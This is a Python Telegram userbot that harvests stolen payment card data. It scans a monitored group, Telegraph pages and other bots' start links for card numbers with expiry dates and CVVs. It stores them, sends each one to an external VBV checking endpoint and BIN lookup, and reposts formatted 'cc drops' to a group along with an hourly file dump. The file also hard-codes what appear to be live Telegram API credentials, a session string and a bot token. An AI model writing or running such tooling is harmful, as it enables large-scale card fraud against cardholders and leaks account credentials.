
from telethon import TelegramClient, events, errors
from telethon.sessions import StringSession
import asyncio
import datetime
import logging
import getpass
import re
import aiohttp
import os
import random
import json

# --- Configuration ---
API_ID = "24319080"
API_HASH = "e63058a24d2b503b797d2e3fc8d65bed"
SESSION_STRING = "1BVtsOHIBu0G5ZeKdxoZWobhoTLehHvYi-gBOInKNrlWqVsYaYasBHknIm5OGXcytw2JBybvoze_0r4T5qfHIreT7urZt73ecx05-tmi5VFGDLPoTtOsE16RpFAOwAI0nLZ9_XMIhfLMkJtVy-Z6853k_jKh2ctE8g0oaIrSpYLz3TGVTCFQJ-YZ-9DRasfpFvrXV3H99ZiEbCm-C_TIOF0iE77x_aUxSShIj22BS1OmmcCG983Kckonh2tGyWaVWuls_dQf2EtIEKv0ojVm-nOU4WiJHb4TuTVVYl2o4bzikcOxHWe5Rb2vcLLYqJ852h68F8rv950TNSTiiO3mVl-VRF2oHAGc="
BOT_TOKEN = "7742035768:AAF7Htolg4m1ad6ghTMue5gp6Z3RwZaF7bo"

USERNAME = "@xRonak"
OFFLINE_MESSAGE_GROUP = "⛅I'm afk now, I will be back and reply soon.."
GROUP_KEYWORDS = ["xxhelpx", "xurgent", "xronak", "xRonak"]
INFO_COMMAND = ".info"
ID_COMMAND = ".id"
AUTHORIZED_USER_ID = 1192484969
SAVE_CHAT_ID = 7087865594

TARGET_GROUP_IDS = [-1001234567890, -1000987654321]  # Замени на актуальные
FORWARD_GROUP_ID = -1002174077087  # Куда отправлять найденные cc
MONITOR_GROUP_ID = -1002682944548  # Группа для мониторинга сообщений

client = None
bot = None
start_time = None
is_active = False
last_online_time = None

# --- Logging setup ---
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('cc_monitor.log'),
        logging.StreamHandler()
    ]
)

CCS_FILE = "kafkascrapper.txt"
PROCESSED_MESSAGES_FILE = "processed_messages.json"
scraped_ccs = []
hourly_task_started = False
hourly_start_time = datetime.datetime.now()

processed_messages = set()
processing_queue = asyncio.Queue()
is_processing = False

# --- Регулярные выражения ---

CC_REGEX = re.compile(
    r"""
    (?P<cc>(?:4\d{12}(?:\d{3})?          # Visa 13 or 16 digits
    |5[1-5]\d{14}                        # MasterCard 16 digits
    |3[47]\d{13}                        # AMEX 15 digits
    |3(?:0[0-5]|[68]\d)\d{11}           # Diners Club
    |6(?:011|5\d{2})\d{12}              # Discover
    |(?:2131|1800|35\d{3})\d{11}))      # JCB
    [\s|:,\-/\\\.]*                     # Separator (optional)
    (?P<month>0[1-9]|1[0-2])            # Month 01-12
    [\s|:,\-/\\\.]*                     # Separator (optional)
    (?P<year>(?:20)?\d{2})              # Year (2 or 4 digits)
    [\s|:,\-/\\\.]*                     # Separator (optional)
    (?P<cvv>\d{3,4})                    # CVV 3 or 4 digits
    """,
    re.VERBOSE | re.IGNORECASE
)

TELEGRAPH_REGEX = re.compile(r'(https?://telegra\.ph/[^\s]+)', re.IGNORECASE)

XFORCE_BOT_LINK_RE = re.compile(
    r"https://t\.me/(?P<botname>[A-Za-z0-9_]+)/(?:Drops)?\\?startapp=(?P<startapp>[a-fA-F0-9]+)",
    re.IGNORECASE
)

# Добавляем регулярку для tg://resolve ссылок
TG_RESOLVE_LINK_RE = re.compile(
    r"tg://resolve\?domain=(?P<botname>[A-Za-z0-9_]+)&start=(?P<startapp>[a-zA-Z0-9_-]+)",
    re.IGNORECASE
)

# --- Вспомогательные функции ---

def get_uptime():
    global start_time
    if start_time:
        uptime = datetime.datetime.now() - start_time
        hours, remainder = divmod(uptime.total_seconds(), 3600)
        minutes, seconds = divmod(remainder, 60)
        return f"{int(hours)}h {int(minutes)}m {int(seconds)}s"
    else:
        return "N/A"

def get_last_online_string():
    global last_online_time
    if last_online_time:
        return f"Last seen offline at: {last_online_time.strftime('%Y-%m-%d %H:%M:%S')}"
    else:
        return "⛅.."

def append_cc_to_file(cc_line):
    try:
        with open(CCS_FILE, "a", encoding="utf-8") as f:
            f.write(cc_line + "\n")
    except Exception as e:
        logging.error(f"Error appending CC to file: {e}")

async def get_random_motivation():
    filename = "motivation.txt"
    default_text = "Have a nice day. 😊"
    if os.path.exists(filename):
        try:
            with open(filename, "r", encoding="utf-8") as f:
                lines = [line.strip() for line in f if line.strip()]
            if lines:
                return random.choice(lines)
        except Exception as e:
            logging.error(f"Error reading motivation.txt: {e}")
    return default_text

# --- Async extraction functions ---

async def extract_ccs_from_text(text):
    results = []
    try:
        clean_text = re.sub(r'[^\w\s|:,\-/\\\.0-9]', ' ', text)
        for match in CC_REGEX.finditer(clean_text):
            cc = match.group('cc')
            month = match.group('month')
            year = match.group('year')
            if len(year) == 4:
                year = year[-2:]
            elif len(year) == 1:
                year = '2' + year
            cvv = match.group('cvv')
            if len(cc) >= 13 and 1 <= int(month) <= 12 and int(year) >= 24:
                results.append((cc, month, year, cvv))
    except Exception as e:
        logging.error(f"Error extracting CCs from text: {e}")
    return results

async def fetch_telegraph_text(url):
    max_retries = 3
    for attempt in range(max_retries):
        try:
            timeout = aiohttp.ClientTimeout(total=10)
            async with aiohttp.ClientSession(timeout=timeout) as session:
                async with session.get(url) as resp:
                    if resp.status == 200:
                        html = await resp.text()
                        text = re.sub(r'<[^>]+>', '', html)
                        return text
        except Exception as e:
            logging.error(f"Attempt {attempt + 1} failed to fetch Telegraph: {e}")
            if attempt < max_retries - 1:
                await asyncio.sleep(2 ** attempt)
    return ""

async def fetch_ccs_from_xforce_link(client, botname, startapp_token):
    max_retries = 2
    for attempt in range(max_retries):
        try:
            bot_entity = await client.get_entity(botname)
            async with client.conversation(bot_entity, timeout=45) as conv:
                await conv.send_message(f"/start {startapp_token}")
                await asyncio.sleep(7)
                responses = []
                for _ in range(5):
                    try:
                        response = await asyncio.wait_for(conv.get_response(), timeout=5)
                        responses.append(response)
                    except asyncio.TimeoutError:
                        break
                ccs = []
                for resp in responses:
                    ccs.extend(await extract_ccs_from_text(resp.text))
                return ccs
        except Exception as e:
            logging.error(f"Attempt {attempt + 1} failed for xForce bot: {e}")
            if attempt < max_retries - 1:
                await asyncio.sleep(3)
    return []

async def fetch_bin_data(bin_number):
    max_retries = 3
    for attempt in range(max_retries):
        try:
            timeout = aiohttp.ClientTimeout(total=8)
            url = f'https://bins.antipublic.cc/bins/{bin_number}'
            async with aiohttp.ClientSession(timeout=timeout) as session:
                async with session.get(url) as resp:
                    if resp.status == 200:
                        return await resp.json()
        except Exception as e:
            logging.error(f"Attempt {attempt + 1} failed to fetch bin data: {e}")
            if attempt < max_retries - 1:
                await asyncio.sleep(1)
    return None

async def fetch_vbv_response(cc_full):
    max_retries = 3
    for attempt in range(max_retries):
        try:
            timeout = aiohttp.ClientTimeout(total=10)
            url = f'http://xronak.site/vbv.php?lista={cc_full}'
            async with aiohttp.ClientSession(timeout=timeout) as session:
                async with session.get(url) as resp:
                    if resp.status == 200:
                        return await resp.text()
        except Exception as e:
            logging.error(f"Attempt {attempt + 1} failed to fetch VBV: {e}")
            if attempt < max_retries - 1:
                await asyncio.sleep(1)
    return "N/A"

# --- Processing queue ---

async def process_message_queue():
    global is_processing
    while True:
        try:
            if not is_processing:
                await asyncio.sleep(1)
                continue
            message_data = await processing_queue.get()
            await process_single_message(message_data)
            processing_queue.task_done()
        except Exception as e:
            logging.error(f"Error in message queue processing: {e}")
            await asyncio.sleep(1)

async def process_single_message(message_data):
    try:
        message_text, message_id = message_data
        if message_id in processed_messages:
            return
        processed_messages.add(message_id)
        ccs = await extract_ccs_from_text(message_text)
        telegraph_links = TELEGRAPH_REGEX.findall(message_text)
        for link in telegraph_links:
            try:
                telegraph_text = await fetch_telegraph_text(link)
                if telegraph_text:
                    ccs.extend(await extract_ccs_from_text(telegraph_text))
            except Exception as e:
                logging.error(f"Failed to fetch from Telegraph: {e}")
        xforce_links = XFORCE_BOT_LINK_RE.findall(message_text)
        for botname, startapp_token in xforce_links:
            try:
                ccs_from_bot = await fetch_ccs_from_xforce_link(client, botname, startapp_token)
                ccs.extend(ccs_from_bot)
            except Exception as e:
                logging.error(f"Failed to fetch from xForce bot: {e}")

        # Обработка новых tg://resolve ссылок
        tg_links = TG_RESOLVE_LINK_RE.findall(message_text)
        for botname, startapp_token in tg_links:
            try:
                ccs_from_bot = await fetch_ccs_from_xforce_link(client, botname, startapp_token)
                ccs.extend(ccs_from_bot)
            except Exception as e:
                logging.error(f"Failed to fetch from tg://resolve bot: {e}")

        for cc, month, year, cvv in ccs:
            await process_single_cc(cc, month, year, cvv)
        if len(processed_messages) % 10 == 0:
            save_processed_messages()
    except Exception as e:
        logging.error(f"Error processing single message: {e}")

async def process_single_cc(cc, month, year, cvv):
    try:
        cc_line = f"{cc}|{month}|{year}|{cvv}"
        if cc_line in scraped_ccs:
            return
        scraped_ccs.append(cc_line)
        append_cc_to_file(cc_line)
        bin_number = cc[:6]

        bin_data_task = fetch_bin_data(bin_number)
        vbv_task = fetch_vbv_response(cc_line)
        motivation_task = get_random_motivation()

        bin_data, vbv_response, motivation_text = await asyncio.gather(
            bin_data_task, vbv_task, motivation_task, return_exceptions=True
        )

        if isinstance(bin_data, Exception):
            logging.error(f"Bin data fetch failed: {bin_data}")
            bin_data = None
        if isinstance(vbv_response, Exception):
            logging.error(f"VBV fetch failed: {vbv_response}")
            vbv_response = "N/A"
        else:
            vbv_response = str(vbv_response).strip()
        if isinstance(motivation_text, Exception):
            logging.error(f"Motivation fetch failed: {motivation_text}")
            motivation_text = "Have a nice day. 😊"

        scheme = bin_data.get('brand', 'N/A').upper() if bin_data else 'N/A'
        card_type = bin_data.get('type', 'N/A').upper() if bin_data else 'N/A'
        brand = bin_data.get('level', 'N/A').upper() if bin_data else 'N/A'
        bank_name = bin_data.get('bank', 'N/A').upper() if bin_data else 'N/A'
        country_name = bin_data.get('country_name', 'N/A').upper() if bin_data else 'N/A'
        country_emoji = bin_data.get('country_flag', 'N/A') if bin_data else 'N/A'
        currency = bin_data.get('country_currencies', ['N/A'])[0].upper() if bin_data and bin_data.get('country_currencies') else 'N/A'

        formatted = FORWARD_FORMAT.format(
            cc=cc, month=month, year=year, cvv=cvv,
            vbv_response=vbv_response,
            card_type=card_type, brand=brand,
            bank_name=bank_name, country_name=country_name,
            country_emoji=country_emoji, currency=currency,
            Motivational_text=motivation_text
        )

        max_send_retries = 3
        for attempt in range(max_send_retries):
            try:
                await client.send_message(FORWARD_GROUP_ID, formatted)
                logging.info(f"Sent CC: {cc_line}")
                break
            except errors.rpcerrorlist.ChatWriteForbiddenError:
                logging.error(f"Cannot write to chat {FORWARD_GROUP_ID}. Check permissions.")
                break
            except errors.rpcerrorlist.FloodWaitError as e:
                logging.warning(f"FloodWait error, waiting {e.seconds} seconds")
                await asyncio.sleep(e.seconds)
            except Exception as e:
                logging.error(f"Attempt {attempt + 1} failed to send message: {e}")
                if attempt < max_send_retries - 1:
                    await asyncio.sleep(2 ** attempt)
    except Exception as e:
        logging.error(f"Error processing CC {cc}: {e}")

# --- Forward message template ---

FORWARD_FORMAT = (
    "𝙆𝙖𝙛𝙠𝙖 • x-Force cc 💮\n"
    "▬▬▬▬▬⌁・⌁・▬▬▬▬▬\n"
    "カ Card: {cc}|{month}|{year}|{cvv}\n"
    "VBV  ➜ {vbv_response}\n"
    "┄┄┄┄┄┄┄┄┄┄┄┄┄┄\n"
    "✿ Type: ➜ {card_type}\n"
    "✿ Level: ➜ {brand}\n"
    "✿ Bank: ➜ {bank_name}\n"
    "✿ Country: ➜ {country_name} {country_emoji}\n"
    "✿ Currency: ➜ {currency}\n"
    "▬▬▬▬▬⌁・⌁・▬▬▬▬▬\n"
    "{Motivational_text}\n"
    "▬▬▬▬▬⌁・⌁・▬▬▬▬▬\n"    
    "◉ Channel ➜ @kafkaupdates\n"
    "◉ Version ➜  alpha1.2.0-0\n"
    "◉ owner  ➜ @xRonak 🌥️\n"
    "˖ ❀ ⋆｡˚▬▬▬▬▬▬▬୨୧⋆ ˚"
)

# --- Hourly dropper ---

async def hourly_dropper(client):
    global scraped_ccs, hourly_start_time
    while True:
        try:
            now = datetime.datetime.now()
            hours_passed = (now - hourly_start_time).total_seconds() // 3600
            
            if scraped_ccs:
                caption = (f"Kafka Hour Drop\n"
                           f"Total CCs: {len(scraped_ccs)}\n"
                           f"Owner: @xRonak\n"
                           f"Backup Group: @kafkascrapperx\n\n"
                           f"Another Drop under 1 hour...")
                try:
                    msg = await client.send_file(
                        FORWARD_GROUP_ID,
                        CCS_FILE,
                        caption=caption
                    )
                    await client.pin_message(FORWARD_GROUP_ID, msg.id, notify=False)
                except Exception as e:
                    logging.error(f"Error sending/pinning CC file: {e}")
                    
            if hours_passed >= 24:
                scraped_ccs = []
                if os.path.exists(CCS_FILE):
                    os.remove(CCS_FILE)
                hourly_start_time = datetime.datetime.now()
                
                if len(processed_messages) > 1000:
                    processed_messages.clear()
                    save_processed_messages()
                    
        except Exception as e:
            logging.error(f"Error in hourly dropper: {e}")
        await asyncio.sleep(3600)

# --- Load/Save processed messages ---

def load_processed_messages():
    global processed_messages
    try:
        if os.path.exists(PROCESSED_MESSAGES_FILE):
            with open(PROCESSED_MESSAGES_FILE, 'r') as f:
                processed_messages = set(json.load(f))
        else:
            processed_messages = set()
        logging.info(f"Loaded {len(processed_messages)} processed message IDs")
    except Exception as e:
        logging.error(f"Error loading processed messages: {e}")
        processed_messages = set()

def save_processed_messages():
    try:
        with open(PROCESSED_MESSAGES_FILE, 'w') as f:
            json.dump(list(processed_messages), f)
        logging.info(f"Saved {len(processed_messages)} processed message IDs")
    except Exception as e:
        logging.error(f"Error saving processed messages: {e}")

# --- Main ---

async def main():
    global client, bot, SESSION_STRING, hourly_task_started, is_processing, is_active, start_time, last_online_time

    load_processed_messages()

    try:
        client = TelegramClient(StringSession(SESSION_STRING), API_ID, API_HASH)
        await client.connect()

        if not await client.is_user_authorized():
            print("Not authorized. Please authorize manually.")
            logging.warning("User not authorized. Attempting to authorize...")
            try:
                await client.start()
            except errors.SessionPasswordNeededError:
                logging.info("Two-step verification is enabled.")
                password = getpass.getpass("Enter your 2FA password: ")
                try:
                    await client.sign_in(password=password)
                except errors.PasswordHashInvalidError:
                    print("Incorrect password.")
                    logging.error("Incorrect password provided.")
                    return
                except Exception as e:
                    print(f"An error occurred during sign-in: {e}")
                    logging.exception("Error during sign-in")
                    return
            except Exception as e:
                print(f"An error occurred during authorization: {e}")
                logging.exception("Error during authorization")
                return
        else:
            logging.info("Client connected successfully")

        if not SESSION_STRING or not await client.is_user_authorized():
            SESSION_STRING = client.session.save()
            print("New session string generated.")
            logging.info("New session string generated.")

        me = await client.get_me()
        print(f"User {me.username} started")
        logging.info(f"User {me.username} started")

        @client.on(events.NewMessage(incoming=True))
        async def handle_message(event):
            global is_active, last_online_time
            if event.sender and hasattr(event.sender, 'bot') and event.sender.bot:
                return
            if not is_active:
                return
            if event.chat_id in TARGET_GROUP_IDS:
                message_text = event.message.message.lower()
                if any(keyword in message_text for keyword in GROUP_KEYWORDS):
                    uptime_str = get_uptime()
                    last_online_str = get_last_online_string()
                    try:
                        await event.reply(f"{OFFLINE_MESSAGE_GROUP} Uptime: {uptime_str}. {last_online_str}")
                    except errors.rpcerrorlist.ChatAdminRequiredError:
                        logging.warning(f"ChatAdminRequiredError in group {event.chat_id}. Skipping reply.")
                        return
                    return

            # Убираем ответ на личные сообщения - ничего не делаем
            # if event.chat_id not in TARGET_GROUP_IDS:
            #     if event.is_private:
            #         return

        @client.on(events.NewMessage(pattern=INFO_COMMAND))
        async def handle_info_command(event):
            if event.sender_id == AUTHORIZED_USER_ID:
                if event.is_reply:
                    replied_to = await event.get_reply_message()
                    user = await client.get_entity(replied_to.sender_id)
                else:
                    user = await client.get_entity(event.sender_id)
                user_info = f"User ID: {user.id}\n" \
                            f"First Name: {user.first_name}\n" \
                            f"Last Name: {user.last_name if user.last_name else 'N/A'}\n" \
                            f"Username: @{user.username if user.username else 'N/A'}\n" \
                            f"Phone: {user.phone if user.phone else 'N/A'}"
                await event.reply(user_info)

        @client.on(events.NewMessage(pattern=ID_COMMAND))
        async def handle_id_command(event):
            if event.sender_id == AUTHORIZED_USER_ID:
                if event.is_reply:
                    replied_to = await event.get_reply_message()
                    chat_id = replied_to.chat_id
                else:
                    chat_id = event.chat_id
                await event.reply(f"Chat ID: {chat_id}")

        @client.on(events.NewMessage(chats=MONITOR_GROUP_ID))
        async def monitor_cc_numbers(event):
            global is_active, is_processing
            if not is_active or not is_processing:
                return
            try:
                message_text = event.message.message or ""
                message_id = event.message.id

                # Добавляем в очередь для обработки
                await processing_queue.put((message_text, message_id))
                logging.info(f"Added message {message_id} to processing queue")

                # Дополнительно обрабатываем tg://resolve ссылки (автоматически)
                tg_links = TG_RESOLVE_LINK_RE.findall(message_text)
                for botname, startapp_token in tg_links:
                    logging.info(f"Found tg://resolve link: bot={botname}, start={startapp_token}")
                    ccs_from_bot = await fetch_ccs_from_xforce_link(client, botname, startapp_token)
                    for cc, month, year, cvv in ccs_from_bot:
                        await process_single_cc(cc, month, year, cvv)

            except Exception as e:
                logging.error(f"Error handling monitor message: {e}")

        asyncio.create_task(process_message_queue())

        bot = TelegramClient('bot', API_ID, API_HASH)
        await bot.start(bot_token=BOT_TOKEN)

        @bot.on(events.NewMessage(pattern='/xx'))
        async def start_handler(event):
            global is_active, start_time, is_processing
            if not is_active:
                is_active = True
                is_processing = True
                start_time = datetime.datetime.now()
                await event.respond("Services started!")
                logging.info("Services started")
            else:
                await event.respond("Services are already running.")

        @bot.on(events.NewMessage(pattern='/off'))
        async def stop_handler(event):
            global is_active, start_time, last_online_time, is_processing
            if is_active:
                is_active = False
                is_processing = False
                start_time = None
                last_online_time = datetime.datetime.now()
                save_processed_messages()
                await event.respond("Services stopped!")
                logging.info("Services stopped")
            else:
                await event.respond("Services are already stopped.")

        @bot.on(events.NewMessage(pattern='/xvxv'))
        async def xvxv_handler(event):
            global is_active, is_processing
            if not is_active:
                is_active = True
                is_processing = True
                await event.respond("CC number monitoring started!")
                logging.info("CC monitoring started")
            else:
                await event.respond("CC number monitoring already running.")

        @bot.on(events.NewMessage(pattern='/status'))
        async def status_handler(event):
            queue_size = processing_queue.qsize()
            processed_count = len(processed_messages)
            cc_count = len(scraped_ccs)
            uptime = get_uptime()
            status_msg = (f"🤖 Bot Status:\n"
                         f"Active: {is_active}\n"
                         f"Processing: {is_processing}\n"
                         f"Uptime: {uptime}\n"
                         f"Queue Size: {queue_size}\n"
                         f"Processed Messages: {processed_count}\n"
                         f"Scraped CCs: {cc_count}")
            await event.respond(status_msg)

        if not hourly_task_started:
            asyncio.create_task(hourly_dropper(client))
            hourly_task_started = True

        print("Bot is running... Press Ctrl+C to stop")
        logging.info("Bot started successfully")

        await bot.run_until_disconnected()

    except Exception as e:
        print(f"An error occurred: {e}")
        logging.exception("An unexpected error occurred:")
    finally:
        save_processed_messages()
        if client:
            await client.disconnect()
        if bot:
            await bot.disconnect()

# --- Graceful shutdown helper ---

async def shutdown(client, bot):
    try:
        logging.info("Saving processed messages before shutdown...")
        save_processed_messages()
    except Exception as e:
        logging.error(f"Error saving processed messages at shutdown: {e}")
    try:
        if client:
            await client.disconnect()
            logging.info("Client disconnected")
    except Exception as e:
        logging.error(f"Error disconnecting client: {e}")
    try:
        if bot:
            await bot.disconnect()
            logging.info("Bot disconnected")
    except Exception as e:
        logging.error(f"Error disconnecting bot: {e}")

# --- Entry point ---

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logging.info("KeyboardInterrupt received. Shutting down...")
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(shutdown(client, bot))
        loop.close()
    except Exception as e:
        logging.error(f"Unexpected error: {e}")
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(shutdown(client, bot))
        loop.close()